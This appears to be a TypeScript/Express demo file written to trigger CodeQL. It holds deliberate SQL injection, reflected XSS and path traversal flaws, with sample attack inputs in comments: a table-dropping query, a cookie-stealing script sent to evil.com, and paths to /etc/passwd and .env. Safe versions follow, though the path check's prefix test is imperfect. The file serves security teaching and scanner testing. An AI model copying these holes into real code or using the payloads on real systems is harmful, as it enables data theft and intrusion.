// =============================================================================
// DEMO FILE — Deliberately contains security vulnerabilities to trigger CodeQL
// =============================================================================
// This file demonstrates what the Security Scan (CodeQL) job catches.
// CodeQL performs static analysis — it traces data flow through the code
// to find patterns that could be exploited by attackers.
//
// Unlike a simple pattern matcher, CodeQL understands that user input
// flowing into a database query without sanitization is dangerous, even
// if it passes through multiple functions first.
// =============================================================================

import { Request, Response } from 'express';

// ---------------------------------------------------------------------------
// VULNERABILITY 1: SQL Injection
// Severity: Critical (CVSS 9.0+)
// ---------------------------------------------------------------------------
// CodeQL traces the data flow:
//   req.query.id (user input) → string concatenation → SQL query
//
// WHY THIS IS DANGEROUS: An attacker can send ?id=1' OR '1'='1 to dump
// the entire table, or ?id=1'; DROP TABLE forms;-- to delete data.
// SQL injection is consistently in the OWASP Top 10 and is one of the
// most exploited vulnerabilities in web applications.
//
// HOW TO FIX: Use parameterized queries (which TypeORM does by default).
//   Instead of: `SELECT * FROM forms WHERE id = '${id}'`
//   Use:        repository.findOne({ where: { id } })
// ---------------------------------------------------------------------------
export async function getFormById(req: Request, res: Response) {
  const formId = req.query.id as string;

  // BAD: User input directly concatenated into SQL query
  const query = `SELECT * FROM form_definitions WHERE form_id = '${formId}'`;

  // In a real app this would execute against the database
  // CodeQL flags this because untrusted data flows into a SQL string
  return res.json({ query });
}

// ---------------------------------------------------------------------------
// VULNERABILITY 2: Cross-Site Scripting (XSS) — Reflected
// Severity: High (CVSS 7.0+)
// ---------------------------------------------------------------------------
// CodeQL traces the data flow:
//   req.query.name (user input) → string interpolation → HTML response
//
// WHY THIS IS DANGEROUS: An attacker can craft a URL like:
//   /search?name=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
// When a victim clicks the link, the script runs in their browser and
// steals their session cookie.
//
// HOW TO FIX: Escape HTML entities before rendering, or use a templating
// engine that auto-escapes (React does this by default).
// ---------------------------------------------------------------------------
export function searchForms(req: Request, res: Response) {
  const searchTerm = req.query.name as string;

  // BAD: User input directly embedded in HTML response without escaping
  const html = `<html><body><h1>Search results for: ${searchTerm}</h1></body></html>`;

  return res.send(html);
}

// ---------------------------------------------------------------------------
// VULNERABILITY 3: Path Traversal
// Severity: High (CVSS 7.0+)
// ---------------------------------------------------------------------------
// CodeQL traces the data flow:
//   req.params.filename (user input) → path concatenation → file read
//
// WHY THIS IS DANGEROUS: An attacker can send:
//   /files/../../etc/passwd  or  /files/../../.env
// to read arbitrary files from the server, including environment variables,
// private keys, and configuration files.
//
// HOW TO FIX: Validate the filename, use path.resolve() and verify the
// resolved path is within the allowed directory.
// ---------------------------------------------------------------------------
import * as fs from 'fs';
import * as path from 'path';

export function downloadFile(req: Request, res: Response) {
  const filename = req.params.filename;

  // BAD: User input directly used in file path without validation
  const filePath = path.join('/uploads', filename);

  // CodeQL flags this because untrusted data flows into a file system operation
  const content = fs.readFileSync(filePath, 'utf-8');
  return res.send(content);
}

// ---------------------------------------------------------------------------
// THE CORRECT WAY — What CodeQL will NOT flag:
// ---------------------------------------------------------------------------
// These patterns are safe because they use parameterized queries,
// output encoding, and input validation.
// ---------------------------------------------------------------------------

// SAFE: Parameterized query (TypeORM handles escaping)
export async function safeGetFormById(formId: string) {
  // TypeORM's query builder uses parameterized queries internally
  // return formRepository.findOne({ where: { formId } });
  return { formId }; // Placeholder for demo
}

// SAFE: Using a framework that auto-escapes (React, or manual escaping)
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

export function safeSearchForms(req: Request, res: Response) {
  const searchTerm = escapeHtml(req.query.name as string);
  const html = `<html><body><h1>Search results for: ${searchTerm}</h1></body></html>`;
  return res.send(html);
}

// SAFE: Validate filename and resolve path within allowed directory
export function safeDownloadFile(req: Request, res: Response) {
  const filename = req.params.filename;
  const uploadsDir = path.resolve('/uploads');
  const filePath = path.resolve(uploadsDir, filename);

  // Verify the resolved path is still within the uploads directory
  if (!filePath.startsWith(uploadsDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  const content = fs.readFileSync(filePath, 'utf-8');
  return res.send(content);
}
